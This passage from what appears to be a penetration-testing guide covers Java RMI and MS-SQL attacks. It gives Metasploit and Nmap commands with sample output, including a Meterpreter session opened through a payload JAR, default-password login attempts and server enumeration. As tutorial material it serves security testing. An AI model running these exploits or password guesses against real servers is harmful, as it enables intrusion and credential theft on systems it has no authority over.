<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Local</span> <span class="n">IP</span><span class="p">:</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">192.168</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span><span class="p">:</span><span class="mi">8080</span><span class="o">/</span><span class="n">LAWVrAFTItH7N</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Server</span> <span class="n">started</span><span class="o">.</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="mf">192.168</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span><span class="p">:</span><span class="mi">1099</span> <span class="o">-</span> <span class="n">Sending</span> <span class="n">RMI</span> <span class="n">Header</span><span class="o">...</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="mf">192.168</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span><span class="p">:</span><span class="mi">1099</span> <span class="o">-</span> <span class="n">Sending</span> <span class="n">RMI</span> <span class="n">Call</span><span class="o">...</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="mf">192.168</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span>     <span class="n">java_rmi_server</span> <span class="o">-</span> <span class="n">Replied</span> <span class="n">to</span> <span class="n">request</span> <span class="k">for</span> <span class="n">payload</span> <span class="n">JAR</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Sending</span> <span class="n">stage</span> <span class="p">(</span><span class="mi">45741</span> <span class="nb">bytes</span><span class="p">)</span> <span class="n">to</span> <span class="mf">192.168</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Meterpreter</span> <span class="n">session</span> <span class="mi">1</span> <span class="n">opened</span> <span class="p">(</span><span class="mf">192.168</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span><span class="p">:</span><span class="mi">4444</span> <span class="o">-&gt;</span> <span class="mf">192.168</span><span class="o">.</span><span class="mf">7.87</span><span class="p">:</span><span class="mi">3899</span><span class="p">)</span> <span class="n">at</span> <span class="mi">2016</span><span class="o">-</span><span class="mi">05</span><span class="o">-</span><span class="mi">03</span> <span class="mi">18</span><span class="p">:</span><span class="mi">24</span><span class="p">:</span><span class="mi">53</span> <span class="o">+</span><span class="mi">0530</span>
<span class="p">[</span><span class="o">-</span><span class="p">]</span> <span class="n">Exploit</span> <span class="n">failed</span><span class="p">:</span> <span class="ne">RuntimeError</span> <span class="n">Timeout</span> <span class="n">HTTPDELAY</span> <span class="n">expired</span> <span class="ow">and</span> <span class="n">the</span> <span class="n">HTTP</span> <span class="n">Server</span> <span class="n">didn</span><span class="s1">&#39;t get a payload request</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Server</span> <span class="n">stopped</span><span class="o">.</span>
</pre></div>
</div>
<p>Here&#8217;s a video of Mubix exploiting it from  Metasploit Minute <a class="reference external" href="https://hak5.org/episodes/metasploit-minute/exploitation-using-java-rmi-service-metasploit-minute">Exploitation using java rmi service</a></p>
</div>
</div>
<div class="section" id="id44">
<h3>Nmap<a class="headerlink" href="#id44" title="Permalink to this headline">¶</a></h3>
<div class="section" id="rmi-vuln-classloader">
<h4>rmi-vuln-classloader<a class="headerlink" href="#rmi-vuln-classloader" title="Permalink to this headline">¶</a></h4>
<p><a class="reference external" href="https://nmap.org/nsedoc/scripts/rmi-vuln-classloader.html">rmi-vuln-classloader.nse</a> Tests whether Java rmiregistry allows class loading. The default configuration of rmiregistry allows loading classes from remote URLs, which can lead to remote code execution. The vendor (Oracle/Sun) classifies this as a design feature.</p>
<p>Sample Output:</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">nmap</span> <span class="o">--</span><span class="n">script</span><span class="o">=</span><span class="n">rmi</span><span class="o">-</span><span class="n">vuln</span><span class="o">-</span><span class="n">classloader</span> <span class="o">-</span><span class="n">p</span> <span class="mi">1099</span> <span class="mf">192.168</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span>

<span class="n">Starting</span> <span class="n">Nmap</span> <span class="mf">7.01</span> <span class="p">(</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">nmap</span><span class="o">.</span><span class="n">org</span> <span class="p">)</span> <span class="n">at</span> <span class="mi">2016</span><span class="o">-</span><span class="mi">05</span><span class="o">-</span><span class="mi">04</span> <span class="mi">00</span><span class="p">:</span><span class="mi">04</span> <span class="n">IST</span>
<span class="n">Nmap</span> <span class="n">scan</span> <span class="n">report</span> <span class="k">for</span> <span class="mf">192.168</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span>
<span class="n">Host</span> <span class="ow">is</span> <span class="n">up</span> <span class="p">(</span><span class="mf">0.0011</span><span class="n">s</span> <span class="n">latency</span><span class="p">)</span><span class="o">.</span>
<span class="n">PORT</span>     <span class="n">STATE</span> <span class="n">SERVICE</span>
<span class="mi">1099</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">rmiregistry</span>
<span class="o">|</span> <span class="n">rmi</span><span class="o">-</span><span class="n">vuln</span><span class="o">-</span><span class="n">classloader</span><span class="p">:</span>
<span class="o">|</span>   <span class="n">VULNERABLE</span><span class="p">:</span>
<span class="o">|</span>   <span class="n">RMI</span> <span class="n">registry</span> <span class="n">default</span> <span class="n">configuration</span> <span class="n">remote</span> <span class="n">code</span> <span class="n">execution</span> <span class="n">vulnerability</span>
<span class="o">|</span>     <span class="n">State</span><span class="p">:</span> <span class="n">VULNERABLE</span>
<span class="o">|</span>       <span class="n">Default</span> <span class="n">configuration</span> <span class="n">of</span> <span class="n">RMI</span> <span class="n">registry</span> <span class="n">allows</span> <span class="n">loading</span> <span class="n">classes</span> <span class="kn">from</span> <span class="nn">remote</span> <span class="n">URLs</span> <span class="n">which</span> <span class="n">can</span> <span class="n">lead</span> <span class="n">to</span> <span class="n">remote</span> <span class="n">code</span> <span class="n">executeion</span><span class="o">.</span>
<span class="o">|</span>
<span class="o">|</span>     <span class="n">References</span><span class="p">:</span>
<span class="o">|</span><span class="n">_</span>      <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">github</span><span class="o">.</span><span class="n">com</span><span class="o">/</span><span class="n">rapid7</span><span class="o">/</span><span class="n">metasploit</span><span class="o">-</span><span class="n">framework</span><span class="o">/</span><span class="n">blob</span><span class="o">/</span><span class="n">master</span><span class="o">/</span><span class="n">modules</span><span class="o">/</span><span class="n">exploits</span><span class="o">/</span><span class="n">multi</span><span class="o">/</span><span class="n">misc</span><span class="o">/</span><span class="n">java_rmi_server</span><span class="o">.</span><span class="n">rb</span>
<span class="n">Nmap</span> <span class="n">done</span><span class="p">:</span> <span class="mi">1</span> <span class="n">IP</span> <span class="n">address</span> <span class="p">(</span><span class="mi">1</span> <span class="n">host</span> <span class="n">up</span><span class="p">)</span> <span class="n">scanned</span> <span class="ow">in</span> <span class="mf">0.37</span> <span class="n">seconds</span>
</pre></div>
</div>
</div>
</div>
</div>
<div class="section" id="ms-sql-port-1433">
<h2>MS-SQL | Port 1433<a class="headerlink" href="#ms-sql-port-1433" title="Permalink to this headline">¶</a></h2>
<div class="section" id="id45">
<h3>Metasploit<a class="headerlink" href="#id45" title="Permalink to this headline">¶</a></h3>
<p><strong>MS-SQL</strong> is really vast multiple <strong>metasploit</strong> modules and blogs existing on the internet, Let&#8217;s check <strong>Metasploit Modules</strong> one by one.</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">auxiliary</span><span class="o">/</span><span class="n">admin</span><span class="o">/</span><span class="n">mssql</span><span class="o">/</span><span class="n">mssql_enum</span>                                           <span class="n">normal</span>     <span class="n">Microsoft</span> <span class="n">SQL</span> <span class="n">Server</span> <span class="n">Configuration</span> <span class="n">Enumerator</span>
<span class="n">auxiliary</span><span class="o">/</span><span class="n">admin</span><span class="o">/</span><span class="n">mssql</span><span class="o">/</span><span class="n">mssql_enum_domain_accounts</span>                           <span class="n">normal</span>     <span class="n">Microsoft</span> <span class="n">SQL</span> <span class="n">Server</span> <span class="n">SUSER_SNAME</span> <span class="n">Windows</span> <span class="n">Domain</span> <span class="n">Account</span> <span class="n">Enumeration</span>
<span class="n">auxiliary</span><span class="o">/</span><span class="n">admin</span><span class="o">/</span><span class="n">mssql</span><span class="o">/</span><span class="n">mssql_enum_domain_accounts_sqli</span>                      <span class="n">normal</span>     <span class="n">Microsoft</span> <span class="n">SQL</span> <span class="n">Server</span> <span class="n">SQLi</span> <span class="n">SUSER_SNAME</span> <span class="n">Windows</span> <span class="n">Domain</span> <span class="n">Account</span> <span class="n">Enumeration</span>
<span class="n">auxiliary</span><span class="o">/</span><span class="n">admin</span><span class="o">/</span><span class="n">mssql</span><span class="o">/</span><span class="n">mssql_enum_sql_logins</span>                                <span class="n">normal</span>     <span class="n">Microsoft</span> <span class="n">SQL</span> <span class="n">Server</span> <span class="n">SUSER_SNAME</span> <span class="n">SQL</span> <span class="n">Logins</span> <span class="n">Enumeration</span>
<span class="n">auxiliary</span><span class="o">/</span><span class="n">admin</span><span class="o">/</span><span class="n">mssql</span><span class="o">/</span><span class="n">mssql_escalate_dbowner</span>                               <span class="n">normal</span>     <span class="n">Microsoft</span> <span class="n">SQL</span> <span class="n">Server</span> <span class="n">Escalate</span> <span class="n">Db_Owner</span>
<span class="n">auxiliary</span><span class="o">/</span><span class="n">admin</span><span class="o">/</span><span class="n">mssql</span><span class="o">/</span><span class="n">mssql_escalate_dbowner_sqli</span>                          <span class="n">normal</span>     <span class="n">Microsoft</span> <span class="n">SQL</span> <span class="n">Server</span> <span class="n">SQLi</span> <span class="n">Escalate</span> <span class="n">Db_Owner</span>
<span class="n">auxiliary</span><span class="o">/</span><span class="n">admin</span><span class="o">/</span><span class="n">mssql</span><span class="o">/</span><span class="n">mssql_escalate_execute_as</span>                            <span class="n">normal</span>     <span class="n">Microsoft</span> <span class="n">SQL</span> <span class="n">Server</span> <span class="n">Escalate</span> <span class="n">EXECUTE</span> <span class="n">AS</span>
<span class="n">auxiliary</span><span class="o">/</span><span class="n">admin</span><span class="o">/</span><span class="n">mssql</span><span class="o">/</span><span class="n">mssql_escalate_execute_as_sqli</span>                       <span class="n">normal</span>     <span class="n">Microsoft</span> <span class="n">SQL</span> <span class="n">Server</span> <span class="n">SQLi</span> <span class="n">Escalate</span> <span class="n">Execute</span> <span class="n">AS</span>
<span class="n">auxiliary</span><span class="o">/</span><span class="n">admin</span><span class="o">/</span><span class="n">mssql</span><span class="o">/</span><span class="n">mssql_exec</span>                                           <span class="n">normal</span>     <span class="n">Microsoft</span> <span class="n">SQL</span> <span class="n">Server</span> <span class="n">xp_cmdshell</span> <span class="n">Command</span> <span class="n">Execution</span>
<span class="n">auxiliary</span><span class="o">/</span><span class="n">admin</span><span class="o">/</span><span class="n">mssql</span><span class="o">/</span><span class="n">mssql_findandsampledata</span>                              <span class="n">normal</span>     <span class="n">Microsoft</span> <span class="n">SQL</span> <span class="n">Server</span> <span class="n">Find</span> <span class="ow">and</span> <span class="n">Sample</span> <span class="n">Data</span>
<span class="n">auxiliary</span><span class="o">/</span><span class="n">admin</span><span class="o">/</span><span class="n">mssql</span><span class="o">/</span><span class="n">mssql_idf</span>                                            <span class="n">normal</span>     <span class="n">Microsoft</span> <span class="n">SQL</span> <span class="n">Server</span> <span class="n">Interesting</span> <span class="n">Data</span> <span class="n">Finder</span>
<span class="n">auxiliary</span><span class="o">/</span><span class="n">admin</span><span class="o">/</span><span class="n">mssql</span><span class="o">/</span><span class="n">mssql_ntlm_stealer</span>                                   <span class="n">normal</span>     <span class="n">Microsoft</span> <span class="n">SQL</span> <span class="n">Server</span> <span class="n">NTLM</span> <span class="n">Stealer</span>
<span class="n">auxiliary</span><span class="o">/</span><span class="n">admin</span><span class="o">/</span><span class="n">mssql</span><span class="o">/</span><span class="n">mssql_ntlm_stealer_sqli</span>                              <span class="n">normal</span>     <span class="n">Microsoft</span> <span class="n">SQL</span> <span class="n">Server</span> <span class="n">SQLi</span> <span class="n">NTLM</span> <span class="n">Stealer</span>
<span class="n">auxiliary</span><span class="o">/</span><span class="n">admin</span><span class="o">/</span><span class="n">mssql</span><span class="o">/</span><span class="n">mssql_sql</span>                                            <span class="n">normal</span>     <span class="n">Microsoft</span> <span class="n">SQL</span> <span class="n">Server</span> <span class="n">Generic</span> <span class="n">Query</span>
<span class="n">auxiliary</span><span class="o">/</span><span class="n">admin</span><span class="o">/</span><span class="n">mssql</span><span class="o">/</span><span class="n">mssql_sql_file</span>                                       <span class="n">normal</span>     <span class="n">Microsoft</span> <span class="n">SQL</span> <span class="n">Server</span> <span class="n">Generic</span> <span class="n">Query</span> <span class="kn">from</span> <span class="nn">File</span>
<span class="n">auxiliary</span><span class="o">/</span><span class="n">analyze</span><span class="o">/</span><span class="n">jtr_mssql_fast</span>                                           <span class="n">normal</span>     <span class="n">John</span> <span class="n">the</span> <span class="n">Ripper</span> <span class="n">MS</span> <span class="n">SQL</span> <span class="n">Password</span> <span class="n">Cracker</span> <span class="p">(</span><span class="n">Fast</span> <span class="n">Mode</span><span class="p">)</span>
<span class="n">auxiliary</span><span class="o">/</span><span class="n">gather</span><span class="o">/</span><span class="n">lansweeper_collector</span>                                      <span class="n">normal</span>     <span class="n">Lansweeper</span> <span class="n">Credential</span> <span class="n">Collector</span>
<span class="n">auxiliary</span><span class="o">/</span><span class="n">scanner</span><span class="o">/</span><span class="n">mssql</span><span class="o">/</span><span class="n">mssql_hashdump</span>                                     <span class="n">normal</span>     <span class="n">MSSQL</span> <span class="n">Password</span> <span class="n">Hashdump</span>
<span class="n">auxiliary</span><span class="o">/</span><span class="n">scanner</span><span class="o">/</span><span class="n">mssql</span><span class="o">/</span><span class="n">mssql_login</span>                                        <span class="n">normal</span>     <span class="n">MSSQL</span> <span class="n">Login</span> <span class="n">Utility</span>
<span class="n">auxiliary</span><span class="o">/</span><span class="n">scanner</span><span class="o">/</span><span class="n">mssql</span><span class="o">/</span><span class="n">mssql_ping</span>                                         <span class="n">normal</span>     <span class="n">MSSQL</span> <span class="n">Ping</span> <span class="n">Utility</span>
<span class="n">auxiliary</span><span class="o">/</span><span class="n">scanner</span><span class="o">/</span><span class="n">mssql</span><span class="o">/</span><span class="n">mssql_schemadump</span>                                   <span class="n">normal</span>     <span class="n">MSSQL</span> <span class="n">Schema</span> <span class="n">Dump</span>
</pre></div>
</div>
<div class="section" id="mssql-ping-utility">
<h4>MSSQL Ping Utility<a class="headerlink" href="#mssql-ping-utility" title="Permalink to this headline">¶</a></h4>
<p>Queries the MSSQL instance for information. This will also provide if any ms-sql is running on different ports.</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">use</span> <span class="n">auxiliary</span><span class="o">/</span><span class="n">scanner</span><span class="o">/</span><span class="n">mssql</span><span class="o">/</span><span class="n">mssql_ping</span>
<span class="n">services</span> <span class="o">-</span><span class="n">p</span> <span class="mi">1433</span> <span class="o">-</span><span class="n">R</span>
</pre></div>
</div>
<p>Sample output:</p>
<div class="highlight-default"><div class="highlight"><pre><span></span>[*] SQL Server information for 10.10.xx.xx:
[+]    ServerName      = SAPBWBI
[+]    InstanceName    = BOE140
[+]    IsClustered     = No
[+]    Version         = 10.0.xx.xx
[+]    tcp             = 50623
[+]    np              = \\SAPBWBI\pipe\MSSQL$BOE140\sql\query
[*] SQL Server information for 10.10.xx.xx:
[+]    ServerName      = MANGOOSE
[+]    InstanceName    = MSSQLSERVER
[+]    IsClustered     = No
[+]    Version         = 11.0.xx.xx
[+]    tcp             = 1433
[*] SQL Server information for 10.10.xx.xx:
[+]    ServerName      = MHE-DMP
[+]    InstanceName    = MSSQLSERVER
[+]    IsClustered     = No
[+]    Version         = 11.0.xx.xx
[+]    tcp             = 1433
[*] SQL Server information for 10.10.xx.xx:
[+]    ServerName      = MHE-DMP
[+]    InstanceName    = MHE_DMP_LIVE
[+]    IsClustered     = No
[+]    Version         = 11.0.xx.xx
[+]    tcp             = 53029
</pre></div>
</div>
<p>After discovering the ms-sql instances, we can check if their are any default passwords.</p>
</div>
<div class="section" id="mssql-login-utility">
<h4>MSSQL Login Utility<a class="headerlink" href="#mssql-login-utility" title="Permalink to this headline">¶</a></h4>
<p>Let&#8217;s see if we have any default passwords. This module simply queries the MSSQL instance for a specific user/pass (default is sa with blank) we always find default passwords such as <a class="reference external" href="mailto:company&#37;&#52;&#48;123">company<span>&#64;</span>123</a> etc. Once in an engagement, out of 200 Ms-sql instance we found around 60 default passwords. ;)</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">use</span> <span class="n">auxiliary</span><span class="o">/</span><span class="n">scanner</span><span class="o">/</span><span class="n">mssql</span><span class="o">/</span><span class="n">mssql_login</span>
<span class="nb">set</span> <span class="n">Password</span> <span class="n">company</span><span class="nd">@123</span>
<span class="n">services</span> <span class="o">-</span><span class="n">p</span> <span class="mi">1433</span> <span class="o">-</span><span class="n">R</span>
</pre></div>
</div>
<p>Sample Output:</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="mf">10.10</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span><span class="p">:</span><span class="mi">1433</span> <span class="o">-</span> <span class="n">MSSQL</span> <span class="o">-</span> <span class="n">Starting</span> <span class="n">authentication</span> <span class="n">scanner</span><span class="o">.</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="mf">10.10</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span><span class="p">:</span><span class="mi">1433</span> <span class="o">-</span> <span class="n">LOGIN</span> <span class="n">SUCCESSFUL</span><span class="p">:</span> <span class="n">WORKSTATION</span>\<span class="n">sa</span><span class="p">:</span><span class="n">company</span><span class="nd">@123</span>
<span class="p">[</span><span class="o">-</span><span class="p">]</span> <span class="mf">10.10</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span><span class="p">:</span><span class="mi">1433</span> <span class="n">MSSQL</span> <span class="o">-</span> <span class="n">LOGIN</span> <span class="n">FAILED</span><span class="p">:</span> <span class="n">WORKSTATION</span>\<span class="n">sa</span><span class="p">:</span><span class="n">company</span><span class="nd">@123</span> <span class="p">(</span><span class="n">Incorrect</span><span class="p">:</span> <span class="p">)</span>
</pre></div>
</div>
<p>Once, we have the credentials to the SQL Server we can use</p>
</div>
<div class="section" id="microsoft-sql-server-configuration-enumerator">
<h4>Microsoft SQL Server Configuration Enumerator<a class="headerlink" href="#microsoft-sql-server-configuration-enumerator" title="Permalink to this headline">¶</a></h4>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">use</span> <span class="n">auxiliary</span><span class="o">/</span><span class="n">admin</span><span class="o">/</span><span class="n">mssql</span><span class="o">/</span><span class="n">mssql_enum</span>
<span class="nb">set</span> <span class="n">rhost</span> <span class="mf">10.10</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span>
<span class="nb">set</span> <span class="n">password</span> <span class="n">company</span><span class="nd">@123</span>
</pre></div>
</div>
<p>Sample Output:</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Running</span> <span class="n">MS</span> <span class="n">SQL</span> <span class="n">Server</span> <span class="n">Enumeration</span><span class="o">...</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Version</span><span class="p">:</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span>    <span class="n">Microsoft</span> <span class="n">SQL</span> <span class="n">Server</span> <span class="mi">2012</span> <span class="o">-</span> <span class="mf">11.0</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span> <span class="p">(</span><span class="n">X64</span><span class="p">)</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span>            <span class="n">Feb</span> <span class="mi">10</span> <span class="mi">2012</span> <span class="mi">19</span><span class="p">:</span><span class="mi">39</span><span class="p">:</span><span class="mi">15</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span>            <span class="n">Copyright</span> <span class="p">(</span><span class="n">c</span><span class="p">)</span> <span class="n">Microsoft</span> <span class="n">Corporation</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span>            <span class="n">Enterprise</span> <span class="n">Edition</span> <span class="p">(</span><span class="mi">64</span><span class="o">-</span><span class="n">bit</span><span class="p">)</span> <span class="n">on</span> <span class="n">Windows</span> <span class="n">NT</span> <span class="mf">6.1</span> <span class="o">&lt;</span><span class="n">X64</span><span class="o">&gt;</span> <span class="p">(</span><span class="n">Build</span> <span class="mi">7601</span><span class="p">:</span> <span class="n">Service</span> <span class="n">Pack</span> <span class="mi">1</span><span class="p">)</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Configuration</span> <span class="n">Parameters</span><span class="p">:</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span>    <span class="n">C2</span> <span class="n">Audit</span> <span class="n">Mode</span> <span class="ow">is</span> <span class="n">Not</span> <span class="n">Enabled</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span>    <span class="n">xp_cmdshell</span> <span class="ow">is</span> <span class="n">Enabled</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span>    <span class="n">remote</span> <span class="n">access</span> <span class="ow">is</span> <span class="n">Enabled</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span>    <span class="n">allow</span> <span class="n">updates</span> <span class="ow">is</span> <span class="n">Not</span> <span class="n">Enabled</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span>    <span class="n">Database</span> <span class="n">Mail</span> <span class="n">XPs</span> <span class="ow">is</span> <span class="n">Not</span> <span class="n">Enabled</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span>    <span class="n">Ole</span> <span class="n">Automation</span> <span class="n">Procedures</span> <span class="n">are</span> <span class="n">Not</span> <span class="n">Enabled</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Databases</span> <span class="n">on</span> <span class="n">the</span> <span class="n">server</span><span class="p">:</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span>    <span class="n">Database</span> <span class="n">name</span><span class="p">:</span><span class="n">master</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span>    <span class="n">Database</span> <span class="n">Files</span> <span class="k">for</span> <span class="n">master</span><span class="p">:</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span>            <span class="n">C</span><span class="p">:</span>\<span class="n">Program</span> <span class="n">Files</span>\<span class="n">Microsoft</span> <span class="n">SQL</span> <span class="n">Server</span>\<span class="n">MSSQL11</span><span class="o">.</span><span class="n">MSSQLSERVER</span>\<span class="n">MSSQL</span>\<span class="n">DATA</span>\<span class="n">master</span><span class="o">.</span><span class="n">mdf</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span>            <span class="n">C</span><span class="p">:</span>\<span class="n">Program</span> <span class="n">Files</span>\<span class="n">Microsoft</span> <span class="n">SQL</span> <span class="n">Server</span>\<span class="n">MSSQL11</span><span class="o">.</span><span class="n">MSSQLSERVER</span>\<span class="n">MSSQL</span>\<span class="n">DATA</span>\<span class="n">mastlog</span><span class="o">.</span><span class="n">ldf</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span>    <span class="n">Database</span> <span class="n">name</span><span class="p">:</span><span class="n">tempdb</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span>    <span class="n">Database</span> <span class="n">Files</span> <span class="k">for</span> <span class="n">tempdb</span><span class="p">:</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span>            <span class="n">D</span><span class="p">:</span>\<span class="n">Program</span> <span class="n">Files</span>\<span class="n">Microsoft</span> <span class="n">SQL</span> <span class="n">Server</span>\<span class="n">MSSQL11</span><span class="o">.</span><span class="n">MSSQLSERVER</span>\<span class="n">MSSQL</span>\<span class="n">Data</span>\<span class="n">tempdb</span><span class="o">.</span><span class="n">mdf</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span>            <span class="n">D</span><span class="p">:</span>\<span class="n">Program</span> <span class="n">Files</span>\<span class="n">Microsoft</span> <span class="n">SQL</span> <span class="n">Server</span>\<span class="n">MSSQL11</span><span class="o">.</span><span class="n">MSSQLSERVER</span>\<span class="n">MSSQL</span>\<span class="n">Data</span>\<span class="n">templog</span><span class="o">.</span><span class="n">ldf</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span>    <span class="n">Database</span> <span class="n">name</span><span class="p">:</span><span class="n">model</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span>    <span class="n">Database</span> <span class="n">Files</span> <span class="k">for</span> <span class="n">model</span><span class="p">:</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span>            <span class="n">C</span><span class="p">:</span>\<span class="n">Program</span> <span class="n">Files</span>\<span class="n">Microsoft</span> <span class="n">SQL</span> <span class="n">Server</span>\<span class="n">MSSQL11</span><span class="o">.</span><span class="n">MSSQLSERVER</span>\<span class="n">MSSQL</span>\<span class="n">DATA</span>\<span class="n">model</span><span class="o">.</span><span class="n">mdf</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span>            <span class="n">C</span><span class="p">:</span>\<span class="n">Program</span> <span class="n">Files</span>\<span class="n">Microsoft</span> <span class="n">SQL</span> <span class="n">Server</span>\<span class="n">MSSQL11</span><span class="o">.</span><span class="n">MSSQLSERVER</span>\<span class="n">MSSQL</span>\<span class="n">DATA</span>\<span class="n">modellog</span><span class="o">.</span><span class="n">ldf</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span>    <span class="n">Database</span> <span class="n">name</span><span class="p">:</span><span class="n">msdb</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span>    <span class="n">Database</span> <span class="n">Files</span> <span class="k">for</span> <span class="n">msdb</span><span class="p">:</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span>            <span class="n">C</span><span class="p">:</span>\<span class="n">Program</span> <span class="n">Files</span>\<span class="n">Microsoft</span> <span class="n">SQL</span> <span class="n">Server</span>\<span class="n">MSSQL11</span><span class="o">.</span><span class="n">MSSQLSERVER</span>\<span class="n">MSSQL</span>\<span class="n">DATA</span>\<span class="n">MSDBData</span><span class="o">.</span><span class="n">mdf</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span>            <span class="n">C</span><span class="p">:</span>\<span class="n">Program</span> <span class="n">Files</span>\<span class="n">Microsoft</span> <span class="n">SQL</span> <span class="n">Server</span>\<span class="n">MSSQL11</span><span class="o">.</span><span class="n">MSSQLSERVER</span>\<span class="n">MSSQL</span>\<span class="n">DATA</span>\<span class="n">MSDBLog</span><span class="o">.</span><span class="n">ldf</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span>    <span class="n">Database</span> <span class="n">name</span><span class="p">:</span><span class="n">ReportServer</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span>    <span class="n">Database</span> <span class="n">Files</span> <span class="k">for</span> <span class="n">ReportServer</span><span class="p">:</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span>            <span class="n">D</span><span class="p">:</span>\<span class="n">Program</span> <span class="n">Files</span>\<span class="n">Microsoft</span> <span class="n">SQL</span> <span class="n">Server</span>\<span class="n">MSSQL11</span><span class="o">.</span><span class="n">MSSQLSERVER</span>\<span class="n">MSSQL</span>\<span class="n">Data</span>\<span class="n">ReportServer</span><span class="o">.</span><span class="n">mdf</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span>            <span class="n">D</span><span class="p">:</span>\<span class="n">Program</span> <span class="n">Files</span>\<span class="n">Microsoft</span> <span class="n">SQL</span> <span class="n">Server</span>\<span class="n">MSSQL11</span><span class="o">.</span><span class="n">MSSQLSERVER</span>\<span class="n">MSSQL</span>\<span class="n">Data</span>\<span class="n">ReportServer_log</span><span class="o">.</span><span class="n">ldf</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span>    <span class="n">Database</span> <span class="n">name</span><span class="p">:</span><span class="n">ReportServerTempDB</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span>    <span class="n">Database</span> <span class="n">Files</span> <span class="k">for</span> <span class="n">ReportServerTempDB</span><span class="p">:</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span>            <span class="n">D</span><span class="p">:</span>\<span class="n">Program</span> <span class="n">Files</span>\<span class="n">Microsoft</span> <span class="n">SQL</span> <span class="n">Server</span>\<span class="n">MSSQL11</span><span class="o">.</span><span class="n">MSSQLSERVER</span>\<span class="n">MSSQL</span>\<span class="n">Data</span>\<span class="n">ReportServerTempDB</span><span class="o">.</span><span class="n">mdf</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span>            <span class="n">D</span><span class="p">:</span>\<span class="n">Program</span> <span class="n">Files</span>\<span class="n">Microsoft</span> <span class="n">SQL</span> <span class="n">Server</span>\<span class="n">MSSQL11</span><span class="o">.</span><span class="n">MSSQLSERVER</span>\<span class="n">MSSQL</span>\<span class="n">Data</span>\<span class="n">ReportServerTempDB_log</span><span class="o">.</span><span class="n">ldf</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">System</span> <span class="n">Logins</span> <span class="n">on</span> <span class="n">this</span> <span class="n">Server</span><span class="p">:</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span>    <span class="n">sa</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span>    <span class="c1">##MS_SQLResourceSigningCertificate##</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span>    <span class="c1">##MS_SQLReplicationSigningCertificate##</span>
